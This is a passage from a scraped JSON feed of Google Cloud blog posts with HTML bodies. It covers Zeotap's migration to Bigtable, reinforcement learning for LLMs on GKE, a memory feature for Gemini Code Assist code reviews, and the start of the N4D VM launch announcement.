unpredictable workloads to meet our stringent SLAs. Bigtable\u2019s ability to deliver low latencies for both reads and writes at scale was crucial \u2014 especially with spiky traffic patterns.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Efficient scalability:</strong><span style=\"vertical-align: baseline;\"> Managing ScyllaDB cluster scaling, rebalancing, and hotspots was operationally intensive. Zeotap handles very spiky and bursty workloads at times exceeding 300,000 writes per second. Bigtable disaggregates compute and storage, allowing for rapid scaling (further enhanced by </span><a href=\"https://cloud.google.com/bigtable/docs/autoscaling\"><span style=\"text-decoration: underline; vertical-align: baseline;\">autoscaling</span></a><span style=\"vertical-align: baseline;\">), which automatically adjusts cluster size in response to demand. This lead to more cost efficiency and helped eliminate idle resources.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Total cost of ownership (TCO):</strong><span style=\"vertical-align: baseline;\"> A significant driver of this migration was the need for cost efficiency and predictability. By moving from ScyllaDB to Bigtable, we achieved a significant 46% reduction in our TCO. This stems from Bigtable's efficient storage and the ability to combine use cases, such as using Bigtable as a hot store and BigQuery as a warm store.</span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Tight integration:</strong><span style=\"vertical-align: baseline;\"> Bigtable\u2019s integration with other Google Cloud services, particularly BigQuery, was a major advantage in reducing operational overhead. Features like </span><a href=\"https://cloud.google.com/bigquery/docs/export-to-bigtable\"><span style=\"text-decoration: underline; vertical-align: baseline;\">reverse ETL</span></a><span style=\"vertical-align: baseline;\"> directly into Bigtable greatly simplifies data pipelines and reduces Zeotap\u2019s operational footprint by 20%.</span></li>\n</ul></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Build smarter with Google Cloud databases!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f93ac305ee0&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Zeotap\u2019s architectural evolution to cloud-native\u00a0</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Zeotap\u2019s transition to Bigtable wasn\u2019t an overnight lift-and-shift, but part of a strategic plan to build a streaming real-time analytics platform that could meet the needs of an evermore demanding customer landscape:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">2020</strong><span style=\"vertical-align: baseline;\">: After running one of the largest graphs with JanusGraph-on-ScyllaDB and a heavy processing operation with Spark on AWS, we made the strategic move to migrate to Google Cloud.</span></li>\n<li><strong style=\"vertical-align: baseline;\">2022</strong><span style=\"vertical-align: baseline;\">: Adopted a Lambda architecture, heavily pivoting into BigQuery, and moving away from graph due to performance issues. ScyllaDB was acting now as a pure key-value store.</span></li>\n<li><strong style=\"vertical-align: baseline;\">2023</strong><span style=\"vertical-align: baseline;\">: Shifted to a Kappa architecture, prioritizing real-time ingestion and streaming. This was a major network redesign to meet the needs of clients for real-time use cases.</span></li>\n<li><strong style=\"vertical-align: baseline;\">2024: </strong><span style=\"vertical-align: baseline;\">Fully committed to a cloud-native model with Bigtable and BigQuery as its core, while eliminating Spark from our stack.</span></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">In our current architecture, Zeotap's ingestion layer runs via Dataflow and a home-grown streaming engine with a combination of Memorystore and Bigtable powering inline enrichment, transformation, and ingestion. We used Memorystore as a lightning-fast cache layer to speed up read-heavy workloads, while helping to reduce strain on Bigtable. Bigtable serves as the hot store for real-time ingestion and data API for low-latency point lookups, while BigQuery acts as the warm and cold store for analytics, inferencing, and batch processing.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_7bv2n8R.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Fig. 1 - Zeotap\u2019s architecture diagram</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This architectural transformation, with Bigtable at its heart, enables us to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Consolidate fragmented data:</strong><span style=\"vertical-align: baseline;\"> Bigtable handles the complex multi-read/write operations required to build single customer views. The data derives from hundreds of different channels, ERP, CRM, web apps, and data warehouses. The data have different types of ID that need to get stitched together as they get consolidated into Bigtable.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Deliver real-time customer 360:</strong><span style=\"vertical-align: baseline;\"> Serves comprehensive customer profiles, including identities, attributes, streaming events, calculated attributes, and consent data \u2014 all through our Bigtable-backed data API. This enables the same unified assets available across the entire customer lifecycle \u2014 empowering customer support, marketers, and data analysts alike.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Optimize AI pipelines:</strong><span style=\"vertical-align: baseline;\"> The synergy between Bigtable as a feature store, and BigQuery as our inferencing platform by leveraging BQML, has dramatically shrunk our time to market for AI model deployment for clients \u2014 down from multiple weeks to less than a week.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Results and looking forward</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Migrating to Bigtable has delivered substantial, quantifiable benefits for Zeotap. Most notably, we achieved a </span><strong style=\"vertical-align: baseline;\">46% decrease in Total Cost of Ownership (TCO)</strong><span style=\"vertical-align: baseline;\"> compared to our previous infrastructure. This cost efficiency was paired with a </span><strong style=\"vertical-align: baseline;\">20% reduction in overall operational tasks and overhead </strong><span style=\"vertical-align: baseline;\">\u2014 a direct result of the tight integration between Bigtable and BigQuery. Beyond resource savings, the platform now offers </span><strong style=\"vertical-align: baseline;\">enhanced performance and reliability </strong><span style=\"vertical-align: baseline;\">\u2014 with lower latencies \u2014 enabling us to confidently meet our stringent Service Level Agreement (SLA) commitments. Furthermore, Bigtable has improved our agility, allowing for faster deployment of AI/ML models across various environments with </span><strong style=\"vertical-align: baseline;\">efficient resource utilization</strong><span style=\"vertical-align: baseline;\">, such as reading batch workloads off our Disaster Recovery (DR) cluster.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Transform your data infrastructure with Bigtable</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Zeotap's migration is a compelling example of how choosing the right database can address the challenges of scale, performance, and operational complexity in the era of real-time data and AI. By leveraging Bigtable's capabilities for high throughput, low-latency reads, and efficient handling of demanding workloads, coupled with its seamless integration with BigQuery, Zeotap built a more flexible, efficient, and cost-effective platform that empowers customers' real-time data initiatives.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Learn more</strong></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Check out the power of </span><a href=\"https://cloud.google.com/bigtable\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Bigtable</span></a><span style=\"vertical-align: baseline;\"> and begin planning your </span><a href=\"https://cloud.google.com/bigtable/docs/cloud-bigtable-for-cassandra-users\"><span style=\"text-decoration: underline; vertical-align: baseline;\">migration</span></a><span style=\"vertical-align: baseline;\"> today.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Discover </span><a href=\"https://cloud.google.com/bigtable/docs/migrate-from-cassandra\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Bigtable\u2019s Cassandra API</span></a><span style=\"vertical-align: baseline;\"> and tools for no-downtime, no code-change migrations from ScyllaDB and Cassandra</span></p>\n</li>\n<li><span style=\"vertical-align: baseline;\">Read more about new Bigtable features like </span><a href=\"https://cloud.google.com/bigtable/docs/introduction-sql#:~:text=GoogleSQL%20for%20Bigtable,-GoogleSQL%20is%20a&amp;text=You%20can%20create%20and%20run,with%20a%20Bigtable%20client%20library.\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SQL support</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/blog/products/databases/distributed-counting-with-bigtable\"><span style=\"text-decoration: underline; vertical-align: baseline;\">distributed counters</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/bigtable/docs/continuous-materialized-views\"><span style=\"text-decoration: underline; vertical-align: baseline;\">continuous materialized views</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/bigtable/docs/tiered-storage\"><span style=\"text-decoration: underline; vertical-align: baseline;\">tiered storage</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/bigtable/docs/data-boost-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">data boost</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n</ul></div>",
        "published_date": "2025-11-10 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/compute/run-high-scale-rl-for-llms-on-gke/",
        "title": "Running high-scale reinforcement learning (RL) for LLMs on GKE",
        "thumbnail": null,
        "author": "Bogdan Berce",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">As Large Language Models (LLMs) evolve, Reinforcement Learning (RL) is becoming the crucial technique for aligning powerful models with human preferences and complex task objectives.</span></p>\n<p><span style=\"vertical-align: baseline;\">However, enterprises that need to implement and scale RL for LLMs are facing infrastructure challenges. The primary hurdles include the memory contention from concurrently hosting multiple large models (such as the actor, critic, reward, and reference models), iterative switching between high latency inference generation, and high throughput training phases.</span></p>\n<p><span style=\"vertical-align: baseline;\">This blog details Google Cloud's full-stack, integrated approach, from custom TPU hardware to the GKE orchestration layer \u2014 and shares how you can solve the hybrid, high-stakes demands of RL at scale.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A quick primer: Reinforcement Learning (RL) for LLMs</strong></h3>\n<p><span style=\"vertical-align: baseline;\">RL is a continuous feedback loop that combines elements of both training and inference. At a high level, the RL loop for LLMs functions as follows:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The LLM generates a response to a given prompt.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">A \"reward model\" (often trained on human preferences) assigns a quantitative score, or reward, to the output.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">An RL algorithm (e.g., DPO, GRPO) uses this reward signal to update the LLM's parameters, adjusting its policy to generate higher-rewarding outputs in subsequent interactions.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">This generation, evaluation, and optimization continually improves the LLM's performance based on predefined objectives.</span></p>\n<p><span style=\"vertical-align: baseline;\">RL workloads are hybrid and cyclical. The main goal of RL is not to minimize error (training) or fast prediction (inference), but to maximize reward through iterative interaction. The primary constraint for the RL workload is not just the computational power, but also system-wide efficiency, specifically minimizing aggregate sampler latency and maximizing the speed of weight copying for efficient end-to-end step time.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Google Cloud's full-stack approach to RL</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Solving these system-wide challenges requires an integrated approach. You can't just have fast hardware or a good orchestrator; you need every layer of the stack to work together. Here is how our full-stack approach is built to solve the specific demands of RL:</span></p>\n<p><strong style=\"vertical-align: baseline;\">1. Flexible, high-performance compute (TPUs and GPUs):</strong><span style=\"vertical-align: baseline;\"> Instead of locking customers into one path, we provide two high-performance options. Our </span><strong style=\"vertical-align: baseline;\">TPU stack</strong><span style=\"vertical-align: baseline;\"> is a vertically integrated, JAX-native solution where our custom hardware (excelling at matrix operations) is co-designed with our post-training libraries (MaxText and Tunix). In parallel, we fully support the </span><strong style=\"vertical-align: baseline;\">NVIDIA GPU ecosystem</strong><span style=\"vertical-align: baseline;\">, partnering with NVIDIA on optimized NeMo RL recipes so customers can leverage their existing expertise directly on GKE.</span></p>\n<p><strong style=\"vertical-align: baseline;\">2. Holistic, full-stack optimization:</strong><span style=\"vertical-align: baseline;\"> We integrate optimization from the bare metal up. This includes our custom TPU accelerators, high-throughput storage (Managed Lustre, Google Cloud Storage), and \u2014 critically \u2014 the orchestration and scheduling that GKE provides. By optimizing the entire stack, we can attack the </span><span style=\"font-style: italic; vertical-align: baseline;\">system-wide</span><span style=\"vertical-align: baseline;\"> latencies that bottleneck hybrid RL workloads.</span></p>\n<p><strong style=\"vertical-align: baseline;\">3. Leadership in open-source:</strong><span style=\"vertical-align: baseline;\"> RL infrastructure is complex and built on a wide range of tools. Our leadership starts with open-sourcing Kubernetes and extends to active partnerships with orchestrators like Ray. We contribute to key projects like vLLM, develop open-source solutions like llm-d for cost-effective serving, and open-source our own high-performance MaxText and Tunix libraries. This helps ensure you can integrate the best tools for the job, not just the ones from a single vendor.</span></p>\n<p><strong style=\"vertical-align: baseline;\">4. Proven, mega-scale orchestration:</strong><span style=\"vertical-align: baseline;\"> Post-training RL can require compute resources that rival pre-training. This requires an orchestration layer that can manage massive, distributed jobs as a single unit. GKE AI mega-clusters support up to 65,000 nodes today, and we are heavily investing in multi-cluster solutions like MultiKueue to scale RL workloads beyond the limits of a single cluster.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Running RL workloads on GKE</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Existing GKE infrastructure is well-suited for demanding RL workloads and provides several infrastructure-level efficiencies.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">The image below outlines the architecture and key recommendations for implementing RL at scale. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_HnbQkXW.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure : GKE infrastructure for running RL</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">At the base, the infrastructure layer provides the foundational hardware, including supported compute types (CPUs, GPUs, and TPUs). You can use the Run:ai model streamer to accelerate the model streaming for all three compute types. High performance storage (Managed Lustre, Cloud Storage) can be used for storage needs for RL.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">The middle layer is the managed K8s layer powered by GKE, which handles the resource orchestration, resource obtainability using Spot or Dynamic Workload Scheduler, autoscaling, placement, job queuing and job scheduling and more at mega scale.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Finally, the open frameworks layer runs on top of GKE, providing the application and execution environment. This includes the managed support for open-source tools such as KubeRay, Slurm and gVisor sandbox for secure isolated task execution.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Building RL workflow</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Before creating an RL workload, you must first identify a clear use case. With that objective defined, you then architect the core components: selecting the algorithm (e.g, DPO, GRPO), the model server (like vLLM or SGLang), the target GPU/TPU hardware, and other critical configurations.</span></p>\n<p><span style=\"vertical-align: baseline;\">Next, you can provision a GKE cluster configured with Workload Identity, GCS Fuse, and DGCM metrics. For robust batch processing, install the Kueue and JobSet APIs. We recommend deploying Ray as the orchestrator on top of this GKE stack. From there, you can launch the Nemo RL container, configure it for your GRPO job, and begin monitoring its execution. For the detailed implementation steps and source code, please refer to this </span><a href=\"https://github.com/AI-Hypercomputer/gpu-recipes/tree/main/RL/a4/recipes/qwen2.5-1.5b/nemoRL\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">repository</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Getting started with RL</strong></h3>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Run RL on GPUs</strong><span style=\"vertical-align: baseline;\">: Try the RL recipe on TPUs using </span><a href=\"https://maxtext.readthedocs.io/en/latest/tutorials/grpo_with_pathways.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MaxText and Pathways</span></a><span style=\"vertical-align: baseline;\"> for GRPO algorithm, or if you use GPUs, try the </span><a href=\"https://github.com/AI-Hypercomputer/gpu-recipes/tree/main/RL/a4/recipes\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">NemoRL recipes</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Partner with the open-source ecosystem</strong><span style=\"vertical-align: baseline;\">: Our leadership in AI is built on open standards like Kubernetes, llm-d, Ray, MaxText or Tunix. We invite you to partner with us to build the future of AI together. Come contribute to llm-d! Join the </span><a href=\"https://llm-d.ai/docs/community\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">llm-d community</span></a><span style=\"vertical-align: baseline;\">, check out the repository on GitHub, and help us define the future of open-source LLM serving.</span></p>\n</li>\n</ol></div>",
        "published_date": "2025-11-10 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/memory-for-ai-code-reviews-using-gemini-code-assist/",
        "title": "Achieve better AI-powered code reviews using new memory capabilities on Gemini Code Assist",
        "thumbnail": null,
        "author": "Umair Idris",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The best feedback during a code review is specific, consistent, and understands the history of a project.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">However, AI code review agents today are often stateless; they have no memory of past interactions. This means you might find the same feedback on new pull requests that you\u2019ve rejected before, because the agent can't learn from your team's guidance, leading to frustration and repeated work.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we\u2019re releasing a new memory capability for </span><a href=\"https://codeassist.google/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Code Assist</span></a><span style=\"vertical-align: baseline;\"> on GitHub for both enterprises and individual developers. Now, you can create a dynamic, evolving memory of your team's coding standards, style, and best practices, all derived from your direct interactions and feedback within pull requests. The memory is stored securely in a Google-managed project specific to your installation, isolating it from other users.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Here's how memory works</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Memory transforms the code review agent from a stateless tool into a long-term project contributor that learns and adapts to your team.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Automated vs. manual memory</span></p>\n<p><span style=\"vertical-align: baseline;\">Gemini Code Assist on GitHub already supports memory in the form of styleguide.md files. These rules are always added to the agent's prompt, which makes it suitable for static, universal guidelines.</span></p>\n<p><span style=\"vertical-align: baseline;\">In contrast, persistent memory introduces a more dynamic and automated approach. It automatically extracts rules from pull request interactions, requiring no manual effort. These learned rules are stored efficiently and are only retrieved and applied when they are relevant to the specific code being reviewed. This creates a smarter, more scalable memory that adapts to your team\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">The process is built on three key pillars:</span></p>\n<h4><strong style=\"vertical-align: baseline;\">1. It learns from your interactions</strong></h4>\n<p><span style=\"vertical-align: baseline;\">The process begins when you and your team do what you already do today - conducting code reviews: When a pull request is merged, Gemini Code Assist on GitHub will analyze the comment threads for feedback. For instance, if Gemini Code Assist on GitHub points out that \u201c</span><span style=\"vertical-align: baseline;\">do not line-wrap import statements</span><span style=\"vertical-align: baseline;\">\u201d in a .java file, and the author disagrees in their comment, the agent sees this interaction as a valuable piece of feedback and will store it. By waiting until a PR is merged, we ensure the conversation is complete and the code is a valuable source of truth.</span></p>\n<h4><strong style=\"vertical-align: baseline;\">2. It intelligently creates, updates and stores rules</strong></h4>\n<p><span style=\"vertical-align: baseline;\">From that simple interaction, persistent memory uses the powerful Gemini model to infer a generalized, reusable rule. In the example above, it would generate a natural language rule like: </span><span style=\"font-style: italic; vertical-align: baseline;\">\"In Java, </span><span style=\"font-style: italic; vertical-align: baseline;\">import statements could be </span><span style=\"font-style: italic; vertical-align: baseline;\">line-wrapped</span><span style=\"font-style: italic; vertical-align: baseline;\">\u201d.</span></p>\n<h4><strong style=\"vertical-align: baseline;\">3. It applies rules to future reviews</strong></h4></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_ifNxRxg.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Once rules are stored in memory, the agent uses them in two critical ways:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">To guide the initial review:</strong><span style=\"vertical-align: baseline;\"> Before it even begins analyzing a new pull request, the agent will query the persistent memory for a broad set of relevant rules for the repository. This helps shape its initial analysis to be more in line with your team's established patterns.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">To filter its own suggestions:</strong><span style=\"vertical-align: baseline;\"> After generating a set of draft review comments, the agent performs a second check. It retrieves highly specific rules related to its own comments and evaluates them. This acts as a filter to ensure its suggestions don't violate a previously learned best practice, allowing it to drop or modify comments before you ever see them.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">As more rules are accrued, the team's tribal knowledge is shared across the codebase through code reviews.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Getting started</strong></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">New to the app?</strong><span style=\"vertical-align: baseline;\">\u00a0</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">If you are an individual developer or OSS maintainer</span><span style=\"vertical-align: baseline;\">, install Gemini Code Assist on GitHub from the </span><a href=\"https://github.com/marketplace/gemini-code-assist\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GitHub Marketplace.</span></a><span style=\"vertical-align: baseline;\">\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">If you are an enterprise customer</span><span style=\"vertical-align: baseline;\">, onboard through the </span><a href=\"https://console.cloud.google.com/gemini-code-assist/agents-tools\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Console.</span><span style=\"text-decoration: underline; vertical-align: baseline;\"> </span></a><span style=\"vertical-align: baseline;\">Review our documentation to learn more </span><a href=\"https://developers.google.com/gemini-code-assist/docs/set-up-code-assist-github\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">about the setup </span></a><span style=\"vertical-align: baseline;\">and using the </span><a href=\"https://developers.google.com/gemini-code-assist/docs/review-github-code\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Code Review capability</span></a><span style=\"vertical-align: baseline;\">. See </span><a href=\"https://www.youtube.com/watch?v=GILoNZWTpQ0\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this video</span></a><span style=\"vertical-align: baseline;\"> for a walkthrough of the process.\u00a0\u00a0\u00a0\u00a0</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Already have the app installed?</strong><span style=\"vertical-align: baseline;\">\u00a0</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">If you are an individual developer or OSS maintainer</span><span style=\"vertical-align: baseline;\">, enable this feature in the Gemini Code Assist on the </span><a href=\"http://codeassist.google/code-review\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Github admin panel.</span></a><span style=\"vertical-align: baseline;\"> </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">If you are an enterprise customer</span><span style=\"vertical-align: baseline;\">, enable this feature in the </span><a href=\"https://console.cloud.google.com/gemini-code-assist/agents-tools\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Console</span></a>.</p>\n</li>\n</ul>\n</ul></div>",
        "published_date": "2025-11-10 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/compute/n4d-vms-based-on-amd-turin-now-ga/",
        "title": "N4D now GA: Gain up to 3.5x price-performance for scale-out workloads",
        "thumbnail": null,
        "author": "Sarthak Sharma",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In today's competitive environment, IT leaders are faced with supporting application scale, rolling out more features, and enabling high-bar customer experiences. This creates a direct and complex challenge: finding the right balance between performance and total cost of ownership (TCO) for the general-purpose workloads that power everyday business operations.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we are announcing the general availability of the N4D machine series, the latest addition to Google Compute Engine\u2019s cost-optimized, general-purpose portfolio. Addressing a wide range of workloads, such as web and application servers, data analytics platforms, and containerized microservices, N4D provides a flexible and price-performant solution.</span></p>\n<p><span style=\"vertical-align: baseline;\">The N4D machine series combines Google's </span><a href=\"https://cloud.google.com/titanium\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Titanium</span></a><span style=\"vertical-align: baseline;\"> infrastructure with 5th Gen </span><a href=\"https://www.amd.com/en/products/processors/server/epyc/9005-series.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AMD EPYC\u2122 \u201cTurin\u201d processors</span></a><span style=\"vertical-align: baseline;\">, delivering up to </span><strong style=\"vertical-align: baseline;\">3.5x the throughput for web-serving workloads</strong><span style=\"vertical-align: baseline;\"> vs. the previous-generation N2D. N4D offers predefined shapes of up to 96 vCPUs and 768 GB of DDR5 memory, up to 50 Gbps of networking bandwidth, and </span><a href=\"https://docs.cloud.google.com/compute/docs/disks/hyperdisks\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hyperdisk</span></a><span style=\"vertical-align: baseline;\"> Balanced and Throughput storage. To deliver a blended cost savings, N4D allows you to move beyond rigid instance sizing for both compute and storage, with </span><a href=\"https://docs.cloud.google.com/compute/docs/instances/creating-instance-with-custom-machine-type\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Custom Machine Types</span></a><span style=\"vertical-align: baseline;\"> to independently configure the exact number of vCPUs and amount of memory, complemented with </span><a href=\"https://docs.cloud.google.com/compute/docs/disks/hyperdisks\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hyperdisk</span></a><span style=\"vertical-align: baseline;\">, for tuning disk storage performance and capacity. For the most demanding general purpose workloads, pair N4D together with consistently high performance of </span><a href=\"https://cloud.google.com/blog/products/compute/c4d-vms-unparalleled-performance-for-business-workloads?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">C4D</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Google Cloud provides workload-optimized infrastructure to ensure the right resources are available for every task. Titanium in particular, with its multi-tier offloads and security capabilities, is foundational to that infrastructure. Titanium offloads networking and storage processing to free up the CPU, and its dedicated SmartNIC manages all I/O, ensuring the AMD EPYC cores are reserved exclusively for your application. Titanium is part of Google Cloud\u2019s vertically integrated stack \u2014 from the custom silicon in our servers to our </span><a href=\"https://cloud.google.com/about/locations\"><span style=\"text-decoration: underline; vertical-align: baseline;\">planet-scale network</span></a><span style=\"vertical-align: baseline;\"> traversing 7.75 million kilometers of terrestrial and subsea fiber across 42 regions \u2014 that is engineered to maximize efficiency and provide the ultra-low latency and high bandwidth to customers at global scale.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A new standard for price-performance</strong></h3>\n<p><span style=\"vertical-align: baseline;\">N4D machine series doesn't just inch past the previous N2D generation; it sprints, delivering up to </span><strong style=\"vertical-align: baseline;\">50% higher price-performance</strong><span style=\"vertical-align: baseline;\"> for general computing workloads and up to </span><strong style=\"vertical-align: baseline;\">70% better price-performance </strong><span style=\"vertical-align: baseline;\">for Java workloads. For web-serving workloads, N4D leverages Titanium and AMD\u2019s Turin processors to drive incredible throughput. This results in up to </span><strong style=\"vertical-align: baseline;\">3.5x the price-performance</strong><span style=\"vertical-align: baseline;\"> vs N2D, driving faster response times and a better overall experience for your end-users.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" 